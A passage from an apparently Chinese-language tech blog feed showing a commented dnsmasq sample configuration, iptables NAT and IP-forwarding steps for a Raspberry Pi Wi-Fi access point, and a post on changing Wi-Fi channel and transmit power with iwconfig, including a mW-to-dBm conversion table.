# They will use SLAAC for addresses.
#dhcp-range&#x3D;1234::, ra-stateless

# Do stateless DHCP, SLAAC, and generate DNS names for SLAAC addresses
# from DHCPv4 leases.
#dhcp-range&#x3D;1234::, ra-stateless, ra-names

# Do router advertisements for all subnets where we&#39;re doing DHCPv6
# Unless overridden by ra-stateless, ra-names, et al, the router 
# advertisements will have the M and O bits set, so that the clients
# get addresses and configuration from DHCPv6, and the A bit reset, so the 
# clients don&#39;t use SLAAC addresses.
#enable-ra

# Supply parameters for specified hosts using DHCP. There are lots
# of valid alternatives, so we will give examples of each. Note that
# IP addresses DO NOT have to be in the range given above, they just
# need to be on the same network. The order of the parameters in these
# do not matter, it&#39;s permissible to give name, address and MAC in any
# order.

# Always allocate the host with Ethernet address 11:22:33:44:55:66
# The IP address 192.168.0.60
#dhcp-host&#x3D;11:22:33:44:55:66,192.168.0.60

# Always set the name of the host with hardware address
# 11:22:33:44:55:66 to be &quot;fred&quot;
#dhcp-host&#x3D;11:22:33:44:55:66,fred

# Always give the host with Ethernet address 11:22:33:44:55:66
# the name fred and IP address 192.168.0.60 and lease time 45 minutes
#dhcp-host&#x3D;11:22:33:44:55:66,fred,192.168.0.60,45m

# Give a host with Ethernet address 11:22:33:44:55:66 or
# 12:34:56:78:90:12 the IP address 192.168.0.60. Dnsmasq will assume
# that these two Ethernet interfaces will never be in use at the same
# time, and give the IP address to the second, even if it is already
# in use by the first. Useful for laptops with wired and wireless
# addresses.
#dhcp-host&#x3D;11:22:33:44:55:66,12:34:56:78:90:12,192.168.0.60

# Give the machine which says its name is &quot;bert&quot; IP address
# 192.168.0.70 and an infinite lease
#dhcp-host&#x3D;bert,192.168.0.70,infinite

# Always give the host with client identifier 01:02:02:04
# the IP address 192.168.0.60
#dhcp-host&#x3D;id:01:02:02:04,192.168.0.60

# Always give the InfiniBand interface with hardware address
# 80:00:00:48:fe:80:00:00:00:00:00:00:f4:52:14:03:00:28:05:81 the
# ip address 192.168.0.61. The client id is derived from the prefix
# ff:00:00:00:00:00:02:00:00:02:c9:00 and the last 8 pairs of
# hex digits of the hardware address.
#dhcp-host&#x3D;id:ff:00:00:00:00:00:02:00:00:02:c9:00:f4:52:14:03:00:28:05:81,192.168.0.61

# Always give the host with client identifier &quot;marjorie&quot;
# the IP address 192.168.0.60
#dhcp-host&#x3D;id:marjorie,192.168.0.60

# Enable the address given for &quot;judge&quot; in &#x2F;etc&#x2F;hosts
# to be given to a machine presenting the name &quot;judge&quot; when
# it asks for a DHCP lease.
#dhcp-host&#x3D;judge

# Never offer DHCP service to a machine whose Ethernet
# address is 11:22:33:44:55:66
#dhcp-host&#x3D;11:22:33:44:55:66,ignore

# Ignore any client-id presented by the machine with Ethernet
# address 11:22:33:44:55:66. This is useful to prevent a machine
# being treated differently when running under different OS&#39;s or
# between PXE boot and OS boot.
#dhcp-host&#x3D;11:22:33:44:55:66,id:*

# Send extra options which are tagged as &quot;red&quot; to
# the machine with Ethernet address 11:22:33:44:55:66
#dhcp-host&#x3D;11:22:33:44:55:66,set:red

# Send extra options which are tagged as &quot;red&quot; to
# any machine with Ethernet address starting 11:22:33:
#dhcp-host&#x3D;11:22:33:*:*:*,set:red

# Give a fixed IPv6 address and name to client with 
# DUID 00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2
# Note the MAC addresses CANNOT be used to identify DHCPv6 clients.
# Note also that the [] around the IPv6 address are obligatory.
#dhcp-host&#x3D;id:00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2, fred, [1234::5] 

# Ignore any clients which are not specified in dhcp-host lines
# or &#x2F;etc&#x2F;ethers. Equivalent to ISC &quot;deny unknown-clients&quot;.
# This relies on the special &quot;known&quot; tag which is set when
# a host is matched.
#dhcp-ignore&#x3D;tag:!known

# Send extra options which are tagged as &quot;red&quot; to any machine whose
# DHCP vendorclass string includes the substring &quot;Linux&quot;
#dhcp-vendorclass&#x3D;set:red,Linux

# Send extra options which are tagged as &quot;red&quot; to any machine one
# of whose DHCP userclass strings includes the substring &quot;accounts&quot;
#dhcp-userclass&#x3D;set:red,accounts

# Send extra options which are tagged as &quot;red&quot; to any machine whose
# MAC address matches the pattern.
#dhcp-mac&#x3D;set:red,00:60:8C:*:*:*

# If this line is uncommented, dnsmasq will read &#x2F;etc&#x2F;ethers and act
# on the ethernet-address&#x2F;IP pairs found there just as if they had
# been given as --dhcp-host options. Useful if you keep
# MAC-address&#x2F;host mappings there for other purposes.
#read-ethers

# Send options to hosts which ask for a DHCP lease.
# See RFC 2132 for details of available options.
# Common options can be given to dnsmasq by name:
# run &quot;dnsmasq --help dhcp&quot; to get a list.
# Note that all the common settings, such as netmask and
# broadcast address, DNS server and default route, are given
# sane defaults by dnsmasq. You very likely will not need
# any dhcp-options. If you use Windows clients and Samba, there
# are some options which are recommended, they are detailed at the
# end of this section.

# Override the default route supplied by dnsmasq, which assumes the
# router is the same machine as the one running dnsmasq.
#dhcp-option&#x3D;3,1.2.3.4

# Do the same thing, but using the option name
#dhcp-option&#x3D;option:router,1.2.3.4

# Override the default route supplied by dnsmasq and send no default
# route at all. Note that this only works for the options sent by
# default (1, 3, 6, 12, 28) the same line will send a zero-length option
# for all other option numbers.
#dhcp-option&#x3D;3

# Set the NTP time server addresses to 192.168.0.4 and 10.10.0.5
#dhcp-option&#x3D;option:ntp-server,192.168.0.4,10.10.0.5

# Send DHCPv6 option. Note [] around IPv6 addresses.
#dhcp-option&#x3D;option6:dns-server,[1234::77],[1234::88]

# Send DHCPv6 option for namservers as the machine running 
# dnsmasq and another.
#dhcp-option&#x3D;option6:dns-server,[::],[1234::88]

# Ask client to poll for option changes every six hours. (RFC4242)
#dhcp-option&#x3D;option6:information-refresh-time,6h

# Set option 58 client renewal time (T1). Defaults to half of the
# lease time if not specified. (RFC2132)
#dhcp-option&#x3D;option:T1,1m

# Set option 59 rebinding time (T2). Defaults to 7&#x2F;8 of the
# lease time if not specified. (RFC2132)
#dhcp-option&#x3D;option:T2,2m

# Set the NTP time server address to be the same machine as
# is running dnsmasq
#dhcp-option&#x3D;42,0.0.0.0

# Set the NIS domain name to &quot;welly&quot;
#dhcp-option&#x3D;40,welly

# Set the default time-to-live to 50
#dhcp-option&#x3D;23,50

# Set the &quot;all subnets are local&quot; flag
#dhcp-option&#x3D;27,1

# Send the etherboot magic flag and then etherboot options (a string).
#dhcp-option&#x3D;128,e4:45:74:68:00:00
#dhcp-option&#x3D;129,NIC&#x3D;eepro100

# Specify an option which will only be sent to the &quot;red&quot; network
# (see dhcp-range for the declaration of the &quot;red&quot; network)
# Note that the tag: part must precede the option: part.
#dhcp-option &#x3D; tag:red, option:ntp-server, 192.168.1.1

# The following DHCP options set up dnsmasq in the same way as is specified
# for the ISC dhcpcd in
# http:&#x2F;&#x2F;www.samba.org&#x2F;samba&#x2F;ftp&#x2F;docs&#x2F;textdocs&#x2F;DHCP-Server-Configuration.txt
# adapted for a typical dnsmasq installation where the host running
# dnsmasq is also the host running samba.
# you may want to uncomment some or all of them if you use
# Windows clients and Samba.
#dhcp-option&#x3D;19,0           # option ip-forwarding off
#dhcp-option&#x3D;44,0.0.0.0     # set netbios-over-TCP&#x2F;IP nameserver(s) aka WINS server(s)
#dhcp-option&#x3D;45,0.0.0.0     # netbios datagram distribution server
#dhcp-option&#x3D;46,8           # netbios node type

# Send an empty WPAD option. This may be REQUIRED to get windows 7 to behave.
#dhcp-option&#x3D;252,&quot;\n&quot;

# Send RFC-3397 DNS domain search DHCP option. WARNING: Your DHCP client
# probably doesn&#39;t support this......
#dhcp-option&#x3D;option:domain-search,eng.apple.com,marketing.apple.com

# Send RFC-3442 classless static routes (note the netmask encoding)
#dhcp-option&#x3D;121,192.168.1.0&#x2F;24,1.2.3.4,10.0.0.0&#x2F;8,5.6.7.8

# Send vendor-class specific options encapsulated in DHCP option 43.
# The meaning of the options is defined by the vendor-class so
# options are sent only when the client supplied vendor class
# matches the class given here. (A substring match is OK, so &quot;MSFT&quot;
# matches &quot;MSFT&quot; and &quot;MSFT 5.0&quot;). This example sets the
# mtftp address to 0.0.0.0 for PXEClients.
#dhcp-option&#x3D;vendor:PXEClient,1,0.0.0.0

# Send microsoft-specific option to tell windows to release the DHCP lease
# when it shuts down. Note the &quot;i&quot; flag, to tell dnsmasq to send the
# value as a four-byte integer - that&#39;s what microsoft wants. See
# http:&#x2F;&#x2F;technet2.microsoft.com&#x2F;WindowsServer&#x2F;en&#x2F;library&#x2F;a70f1bb7-d2d4-49f0-96d6-4b7414ecfaae1033.mspx?mfr&#x3D;true
#dhcp-option&#x3D;vendor:MSFT,2,1i

# Send the Encapsulated-vendor-class ID needed by some configurations of
# Etherboot to allow is to recognise the DHCP server.
#dhcp-option&#x3D;vendor:Etherboot,60,&quot;Etherboot&quot;

# Send options to PXELinux. Note that we need to send the options even
# though they don&#39;t appear in the parameter request list, so we need
# to use dhcp-option-force here.
# See http:&#x2F;&#x2F;syslinux.zytor.com&#x2F;pxe.php#special for details.
# Magic number - needed before anything else is recognised
#dhcp-option-force&#x3D;208,f1:00:74:7e
# Configuration file name
#dhcp-option-force&#x3D;209,configs&#x2F;common
# Path prefix
#dhcp-option-force&#x3D;210,&#x2F;tftpboot&#x2F;pxelinux&#x2F;files&#x2F;
# Reboot time. (Note &#39;i&#39; to send 32-bit value)
#dhcp-option-force&#x3D;211,30i

# Set the boot filename for netboot&#x2F;PXE. You will only need
# this if you want to boot machines over the network and you will need
# a TFTP server; either dnsmasq&#39;s built-in TFTP server or an
# external one. (See below for how to enable the TFTP server.)
#dhcp-boot&#x3D;pxelinux.0

# The same as above, but use custom tftp-server instead machine running dnsmasq
#dhcp-boot&#x3D;pxelinux,server.name,192.168.1.100

# Boot for iPXE. The idea is to send two different
# filenames, the first loads iPXE, and the second tells iPXE what to
# load. The dhcp-match sets the ipxe tag for requests from iPXE.
#dhcp-boot&#x3D;undionly.kpxe
#dhcp-match&#x3D;set:ipxe,175 # iPXE sends a 175 option.
#dhcp-boot&#x3D;tag:ipxe,http:&#x2F;&#x2F;boot.ipxe.org&#x2F;demo&#x2F;boot.php

# Encapsulated options for iPXE. All the options are
# encapsulated within option 175
#dhcp-option&#x3D;encap:175, 1, 5b         # priority code
#dhcp-option&#x3D;encap:175, 176, 1b       # no-proxydhcp
#dhcp-option&#x3D;encap:175, 177, string   # bus-id
#dhcp-option&#x3D;encap:175, 189, 1b       # BIOS drive code
#dhcp-option&#x3D;encap:175, 190, user     # iSCSI username
#dhcp-option&#x3D;encap:175, 191, pass     # iSCSI password

# Test for the architecture of a netboot client. PXE clients are
# supposed to send their architecture as option 93. (See RFC 4578)
#dhcp-match&#x3D;peecees, option:client-arch, 0 #x86-32
#dhcp-match&#x3D;itanics, option:client-arch, 2 #IA64
#dhcp-match&#x3D;hammers, option:client-arch, 6 #x86-64
#dhcp-match&#x3D;mactels, option:client-arch, 7 #EFI x86-64

# Do real PXE, rather than just booting a single file, this is an
# alternative to dhcp-boot.
#pxe-prompt&#x3D;&quot;What system shall I netboot?&quot;
# or with timeout before first available action is taken:
#pxe-prompt&#x3D;&quot;Press F8 for menu.&quot;, 60

# Available boot services. for PXE.
#pxe-service&#x3D;x86PC, &quot;Boot from local disk&quot;

# Loads &lt;tftp-root&gt;&#x2F;pxelinux.0 from dnsmasq TFTP server.
#pxe-service&#x3D;x86PC, &quot;Install Linux&quot;, pxelinux

# Loads &lt;tftp-root&gt;&#x2F;pxelinux.0 from TFTP server at 1.2.3.4.
# Beware this fails on old PXE ROMS.
#pxe-service&#x3D;x86PC, &quot;Install Linux&quot;, pxelinux, 1.2.3.4

# Use bootserver on network, found my multicast or broadcast.
#pxe-service&#x3D;x86PC, &quot;Install windows from RIS server&quot;, 1

# Use bootserver at a known IP address.
#pxe-service&#x3D;x86PC, &quot;Install windows from RIS server&quot;, 1, 1.2.3.4

# If you have multicast-FTP available,
# information for that can be passed in a similar way using options 1
# to 5. See page 19 of
# http:&#x2F;&#x2F;download.intel.com&#x2F;design&#x2F;archives&#x2F;wfm&#x2F;downloads&#x2F;pxespec.pdf


# Enable dnsmasq&#39;s built-in TFTP server
#enable-tftp

# Set the root directory for files available via FTP.
#tftp-root&#x3D;&#x2F;var&#x2F;ftpd

# Do not abort if the tftp-root is unavailable
#tftp-no-fail

# Make the TFTP server more secure: with this set, only files owned by
# the user dnsmasq is running as will be send over the net.
#tftp-secure

# This option stops dnsmasq from negotiating a larger blocksize for TFTP
# transfers. It will slow things down, but may rescue some broken TFTP
# clients.
#tftp-no-blocksize

# Set the boot file name only when the &quot;red&quot; tag is set.
#dhcp-boot&#x3D;tag:red,pxelinux.red-net

# An example of dhcp-boot with an external TFTP server: the name and IP
# address of the server are given after the filename.
# Can fail with old PXE ROMS. Overridden by --pxe-service.
#dhcp-boot&#x3D;&#x2F;var&#x2F;ftpd&#x2F;pxelinux.0,boothost,192.168.0.3

# If there are multiple external tftp servers having a same name
# (using &#x2F;etc&#x2F;hosts) then that name can be specified as the
# tftp_servername (the third option to dhcp-boot) and in that
# case dnsmasq resolves this name and returns the resultant IP
# addresses in round robin fashion. This facility can be used to
# load balance the tftp load among a set of servers.
#dhcp-boot&#x3D;&#x2F;var&#x2F;ftpd&#x2F;pxelinux.0,boothost,tftp_server_name

# Set the limit on DHCP leases, the default is 150
#dhcp-lease-max&#x3D;150

# The DHCP server needs somewhere on disk to keep its lease database.
# This defaults to a sane location, but if you want to change it, use
# the line below.
#dhcp-leasefile&#x3D;&#x2F;var&#x2F;lib&#x2F;misc&#x2F;dnsmasq.leases

# Set the DHCP server to authoritative mode. In this mode it will barge in
# and take over the lease for any client which broadcasts on the network,
# whether it has a record of the lease or not. This avoids long timeouts
# when a machine wakes up on a new network. DO NOT enable this if there&#39;s
# the slightest chance that you might end up accidentally configuring a DHCP
# server for your campus&#x2F;company accidentally. The ISC server uses
# the same option, and this URL provides more information:
# http:&#x2F;&#x2F;www.isc.org&#x2F;files&#x2F;auth.html
#dhcp-authoritative

# Set the DHCP server to enable DHCPv4 Rapid Commit Option per RFC 4039.
# In this mode it will respond to a DHCPDISCOVER message including a Rapid Commit
# option with a DHCPACK including a Rapid Commit option and fully committed address
# and configuration information. This must only be enabled if either the server is 
# the only server for the subnet, or multiple servers are present and they each
# commit a binding for all clients.
#dhcp-rapid-commit

# Run an executable when a DHCP lease is created or destroyed.
# The arguments sent to the script are &quot;add&quot; or &quot;del&quot;,
# then the MAC address, the IP address and finally the hostname
# if there is one.
#dhcp-script&#x3D;&#x2F;bin&#x2F;echo

# Set the cachesize here.
#cache-size&#x3D;150

# If you want to disable negative caching, uncomment this.
#no-negcache

# Normally responses which come from &#x2F;etc&#x2F;hosts and the DHCP lease
# file have Time-To-Live set as zero, which conventionally means
# do not cache further. If you are happy to trade lower load on the
# server for potentially stale date, you can set a time-to-live (in
# seconds) here.
#local-ttl&#x3D;

# If you want dnsmasq to detect attempts by Verisign to send queries
# to unregistered .com and .net hosts to its sitefinder service and
# have dnsmasq instead return the correct NXDOMAIN response, uncomment
# this line. You can add similar lines to do the same for other
# registries which have implemented wildcard A records.
#bogus-nxdomain&#x3D;64.94.110.11

# If you want to fix up DNS results from upstream servers, use the
# alias option. This only works for IPv4.
# This alias makes a result of 1.2.3.4 appear as 5.6.7.8
#alias&#x3D;1.2.3.4,5.6.7.8
# and this maps 1.2.3.x to 5.6.7.x
#alias&#x3D;1.2.3.0,5.6.7.0,255.255.255.0
# and this maps 192.168.0.10-&gt;192.168.0.40 to 10.0.0.10-&gt;10.0.0.40
#alias&#x3D;192.168.0.10-192.168.0.40,10.0.0.0,255.255.255.0

# Change these lines if you want dnsmasq to serve MX records.

# Return an MX record named &quot;maildomain.com&quot; with target
# servermachine.com and preference 50
#mx-host&#x3D;maildomain.com,servermachine.com,50

# Set the default target for MX records created using the localmx option.
#mx-target&#x3D;servermachine.com

# Return an MX record pointing to the mx-target for all local
# machines.
#localmx

# Return an MX record pointing to itself for all local machines.
#selfmx

# Change the following lines if you want dnsmasq to serve SRV
# records.  These are useful if you want to serve ldap requests for
# Active Directory and other windows-originated DNS requests.
# See RFC 2782.
# You may add multiple srv-host lines.
# The fields are &lt;name&gt;,&lt;target&gt;,&lt;port&gt;,&lt;priority&gt;,&lt;weight&gt;
# If the domain part if missing from the name (so that is just has the
# service and protocol sections) then the domain given by the domain&#x3D;
# config option is used. (Note that expand-hosts does not need to be
# set for this to work.)

# A SRV record sending LDAP for the example.com domain to
# ldapserver.example.com port 389
#srv-host&#x3D;_ldap._tcp.example.com,ldapserver.example.com,389

# A SRV record sending LDAP for the example.com domain to
# ldapserver.example.com port 389 (using domain&#x3D;)
#domain&#x3D;example.com
#srv-host&#x3D;_ldap._tcp,ldapserver.example.com,389

# Two SRV records for LDAP, each with different priorities
#srv-host&#x3D;_ldap._tcp.example.com,ldapserver.example.com,389,1
#srv-host&#x3D;_ldap._tcp.example.com,ldapserver.example.com,389,2

# A SRV record indicating that there is no LDAP server for the domain
# example.com
#srv-host&#x3D;_ldap._tcp.example.com

# The following line shows how to make dnsmasq serve an arbitrary PTR
# record. This is useful for DNS-SD. (Note that the
# domain-name expansion done for SRV records _does_not
# occur for PTR records.)
#ptr-record&#x3D;_http._tcp.dns-sd-services,&quot;New Employee Page._http._tcp.dns-sd-services&quot;

# Change the following lines to enable dnsmasq to serve TXT records.
# These are used for things like SPF and zeroconf. (Note that the
# domain-name expansion done for SRV records _does_not
# occur for TXT records.)

#Example SPF.
#txt-record&#x3D;example.com,&quot;v&#x3D;spf1 a -all&quot;

#Example zeroconf
#txt-record&#x3D;_http._tcp.example.com,name&#x3D;value,paper&#x3D;A4

# Provide an alias for a &quot;local&quot; DNS name. Note that this _only_ works
# for targets which are names from DHCP or &#x2F;etc&#x2F;hosts. Give host
# &quot;bert&quot; another name, bertrand
#cname&#x3D;bertand,bert

# For debugging purposes, log each DNS query as it passes through
# dnsmasq.
#log-queries

# Log lots of extra information about DHCP transactions.
#log-dhcp

# Include another lot of configuration options.
#conf-file&#x3D;&#x2F;etc&#x2F;dnsmasq.more.conf
#conf-dir&#x3D;&#x2F;etc&#x2F;dnsmasq.d

# Include all the files in a directory except those ending in .bak
#conf-dir&#x3D;&#x2F;etc&#x2F;dnsmasq.d,.bak

# Include all files in a directory which end in .conf
#conf-dir&#x3D;&#x2F;etc&#x2F;dnsmasq.d&#x2F;,*.conf

# If a DHCP client claims that its name is &quot;wpad&quot;, ignore that.
# This fixes a security hole. see CERT Vulnerability VU#598349
#dhcp-name-match&#x3D;set:wpad-ignore,wpad
#dhcp-ignore-names&#x3D;tag:wpad-ignore

# Delays sending DHCPOFFER and proxydhcp replies for at least the specified number of seconds.
dhcp-mac&#x3D;set:client_is_a_pi,B8:27:EB:*:*:*
dhcp-reply-delay&#x3D;tag:client_is_a_pi,2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ipv4转发"><a href="#ipv4转发" class="headerlink" title="ipv4转发"></a>ipv4转发</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 打开sysctl.conf文件
sudo vim &#x2F;etc&#x2F;sysctl.conf
&#x2F;&#x2F; 去掉“#net.ipv4.ip_forward&#x3D;1”前的#注释

&#x2F;&#x2F; 立即生效
sudo sh -c &quot;echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward&quot;
&#x2F;&#x2F; 在WiFi的配置接口eth0接口wlan0之间建立NAT，分享有线网到无线上

#sudo iptables -A INPUT -p tcp --dport 139 -j ACCEPT
#sudo iptables -A OUTPUT -p tcp --sport 139 -j ACCEPT
#sudo iptables -A INPUT -p tcp --dport 445 -j ACCEPT
#sudo iptables -A OUTPUT -p tcp --sport 445 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

&#x2F;&#x2F; 将这些规应用于我们的每一次启动PI
sudo sh -c &quot;iptables-save &gt; &#x2F;etc&#x2F;iptables.ipv4.nat&quot;
sudo vim &#x2F;etc&#x2F;rc.local
&#x2F;&#x2F; 添加如下行，在 exit 0 之前
iptables-restore &lt; &#x2F;etc&#x2F;iptables.ipv4.nat

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>就这样改是我尝试了两天的结果，就很烧脑，可以尝试都改成和我一样的就可以用了！</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux系统通信功率信道修改方法</title>
    <url>/2021/04/22/linux%E7%B3%BB%E7%BB%9F%E9%80%9A%E4%BF%A1%E5%8A%9F%E7%8E%87%E4%BF%A1%E9%81%93%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux系统通信功率信道修改方法"><a href="#linux系统通信功率信道修改方法" class="headerlink" title="linux系统通信功率信道修改方法"></a>linux系统通信功率信道修改方法</h1><h2 id="配置频段"><a href="#配置频段" class="headerlink" title="配置频段"></a>配置频段</h2><h3 id="可以先查看有哪些频段："><a href="#可以先查看有哪些频段：" class="headerlink" title="可以先查看有哪些频段："></a>可以先查看有哪些频段：</h3><p><code>iwlist channel</code> </p>
<p>可用信道<br><pre class="line-numbers language-none"><code class="language-none">wlan0     13 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          Channel 05 : 2.432 GHz
          Channel 06 : 2.437 GHz
          Channel 07 : 2.442 GHz
          Channel 08 : 2.447 GHz
          Channel 09 : 2.452 GHz
          Channel 10 : 2.457 GHz
          Channel 11 : 2.462 GHz
          Channel 12 : 2.467 GHz
          Channel 13 : 2.472 GHz
          Current Frequency:2.422 GHz (Channel 3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="改变信道"><a href="#改变信道" class="headerlink" title="改变信道"></a>改变信道</h3><p><code>sudo iwconfig wlan1 channel 1</code></p>
<p>iwlist channel显示：</p>
<pre class="line-numbers language-none"><code class="language-none">13 channels in total; available frequencies :
        Current Frequency:2.412 GHz (Channel 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="修改发射功率"><a href="#修改发射功率" class="headerlink" title="修改发射功率"></a>修改发射功率</h3><p><code>sudo iwconfig wlan1 txpower X</code></p>
<p>Tx 是发射（Transmits）的简称。无线电波的发射功率是指在给定频段范围内的能量，通常有两种衡量或测量标准：</p>
<ol>
<li>功率（W）：相对1 瓦（Watts）的线性水准。例如,WiFi 无线网卡的发射功率通常为0.036W ，或者说36mW。</li>
<li>增益（dBm）：相对1 毫瓦（milliwatt）的比例水准。例如,WiFi 无线网卡的发射增益为15.56dBm。</li>
</ol>
<ul>
<li>功率单位mW 和dBm 的换算：</li>
</ul>
<ol>
<li>dBm = 10 * lg[ 功率mW]               //即，以10为底数取[功率mW]对数，然再乘以10</li>
<li>mW = 10^[增益dBm / 10dBm]     //即，以10为底数，[增益dBm/10dBm]为指数，计算取值</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">    10    W        的无线发射功率为  40 dBm
    6.4   W        的无线发射功率为  38 dBm
    3.2   W        的无线发射功率为  35 dBm
    1.6   W        的无线发射功率为  32 dBm    
    1000  mW       的无线发射功率为  30 dBm
    800   mW       的无线发射功率为  29 dBm
    400   mW       的无线发射功率为  26 dBm
    200   mW       的无线发射功率为  23 dBm
    100   mW       的无线发射功率为  20 dBm
    50    mW       的无线发射功率为  17 dBm
    25    mW       的无线发射功率为  14 dBm
    12.5  mW       的无线发射功率为  11 dBm
